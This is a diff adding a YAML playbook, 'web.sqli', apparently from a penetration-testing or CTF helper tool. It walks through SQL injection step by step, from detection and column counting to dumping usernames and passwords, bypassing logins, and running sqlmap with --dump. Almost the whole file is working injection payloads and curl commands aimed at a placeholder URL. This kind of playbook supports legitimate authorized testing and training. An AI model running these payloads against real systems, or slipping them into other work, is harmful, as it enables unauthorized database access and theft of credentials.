@@ -1,0 +1,137 @@
+name: web.sqli
+
+steps:
+
+  - id: detect_sqli
+    title: Detect SQL Injection
+
+    info: |
+      Identify if input is reflected in SQL queries.
+
+    checklist:
+      - Test parameters in GET and POST
+      - Try numeric vs string inputs
+      - Look for SQL errors or different responses
+
+    payloads:
+      - '
+      - "
+      - '
+      - 1'
+      - 1"
+
+    commands:
+      - curl "{url}/?id=1'"
+      - curl "{url}/?id=1\""
+
+  - id: confirm_sqli
+    title: Confirm SQL Injection
+
+    info: |
+      Confirm injection using boolean-based or error-based techniques.
+
+    checklist:
+      - Compare TRUE vs FALSE conditions
+      - Look for content differences
+      - Use AND / OR logic
+
+    payloads:
+      - "' AND 1=1-- -"
+      - "' AND 1=2-- -"
+      - "' OR 1=1-- -"
+
+    commands:
+      - curl "{url}/?id=1' AND 1=1-- -"
+      - curl "{url}/?id=1' AND 1=2-- -"
+
+  - id: determine_columns
+    title: Determine Column Count
+
+    info: |
+      Find number of columns using ORDER BY or UNION.
+
+    checklist:
+      - Increment ORDER BY until error
+      - Try UNION SELECT NULL,...
+
+    payloads:
+      - "' ORDER BY 1-- -"
+      - "' ORDER BY 2-- -"
+      - "' ORDER BY 3-- -"
+      - "' UNION SELECT NULL-- -"
+      - "' UNION SELECT NULL,NULL-- -"
+
+    commands:
+      - curl "{url}/?id=1' ORDER BY 3-- -"
+
+  - id: find_reflection
+    title: Find Reflected Columns
+
+    info: |
+      Identify which columns are visible in the response.
+
+    checklist:
+      - Replace NULL with strings
+      - Look for output in page
+
+    payloads:
+      - "' UNION SELECT 'a','b'-- -"
+      - "' UNION SELECT 'test',NULL-- -"
+
+    commands:
+      - curl "{url}/?id=1' UNION SELECT 'test','123'-- -"
+
+  - id: extract_data
+    title: Extract Database Data
+
+    info: |
+      Extract useful data like users, passwords, etc.
+
+    checklist:
+      - Enumerate tables
+      - Extract usernames/passwords
+      - Look for interesting columns
+
+    payloads:
+      - "' UNION SELECT username,password FROM users-- -"
+      - "' UNION SELECT table_name,NULL FROM information_schema.tables-- -"
+
+    commands:
+      - curl "{url}/?id=1' UNION SELECT username,password FROM users-- -"
+
+  - id: auth_bypass
+    title: Authentication Bypass
+
+    info: |
+      Try bypassing login using SQL injection.
+
+    checklist:
+      - Test login forms
+      - Use OR conditions
+
+    payloads:
+      - "' OR 1=1-- -"
+      - "admin'-- -"
+
+    commands:
+      - curl -X POST "{url}/login" -d "username=admin'-- -&password=x"
+
+  - id: automate
+    title: Automate with sqlmap
+
+    info: |
+      Use sqlmap to automate detection and exploitation.
+
+    checklist:
+      - Confirm injection manually first
+      - Use correct request format
+      - Try dumping database
+
+    commands:
+      - sqlmap -u "{url}/?id=1" --dbs
+      - sqlmap -u "{url}/?id=1" --dump
+
+    run:
+      type: module
+      name: ad.test
+      args: []
